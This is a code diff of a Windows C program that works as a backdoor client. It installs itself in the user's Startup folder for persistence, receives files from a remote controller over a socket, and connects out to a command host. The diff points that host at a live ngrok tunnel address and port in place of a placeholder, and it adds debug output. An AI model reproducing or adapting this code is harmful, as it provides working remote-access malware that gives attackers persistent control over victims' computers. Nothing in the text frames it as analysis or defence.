@@ -6,8 +6,8 @@
 */
 
 #include <stdio.h>
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <ws2tcpip.h>
 #include <tchar.h>
 #include <string.h>
@@ -111,10 +111,12 @@ int to_startup( char* path, char* filename, char* out_name ) {
 
     char buffer[1];
     if ( (fptr = fopen(filename, "rb")) == 0 ) {
+        printf("err 0\n");
         return 1;
     }
 
     if ( (fptw = fopen(out_name, "wb")) == 0 ) {
+        printf("err 1: %s\n", out_name);
         return 1;
     }
 
@@ -150,7 +152,7 @@ int download_file( SOCKET sock ) {
     pt.bytesRecvd = recv(sock, pt.name, sizeof(pt.name), 0);
     send(sock, "done", strlen("done"), 0);
     
-    fptr = fopen(pt.name, "ab");
+    fptr = fopen(pt.name, "wb");
     if (fptr == NULL) {
         return 1;
     }
@@ -429,6 +431,7 @@ int main( int argc, char* argv[] ) {
     char* path = getenv("USERPROFILE");
     int count = 0;
     int iResult;
+    int PORT;
     int i = 0;
     
     
@@ -437,7 +440,8 @@ int main( int argc, char* argv[] ) {
         return 1;
     }
 
-    host_name = "0.0.0.0"; // Change This To You're Host
+    host_name = "8.tcp.ngrok.io"; // Change This To You're Host
+    PORT = 13577; // Change This To You're Port
     remoteHost = gethostbyname(host_name);
     
     if ( remoteHost == NULL ) {
@@ -466,7 +470,6 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 5555; // Change This To You're Port
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
@@ -494,11 +497,11 @@ int main( int argc, char* argv[] ) {
         
         if ( is_file_exist(path_name) != 0 ) {
             to_startup(path, argv[0], path_name);
+            printf("A\n");
         }
     }
 
     
     ClientSoc(IP, PORT);
-    
     return 0;
 }
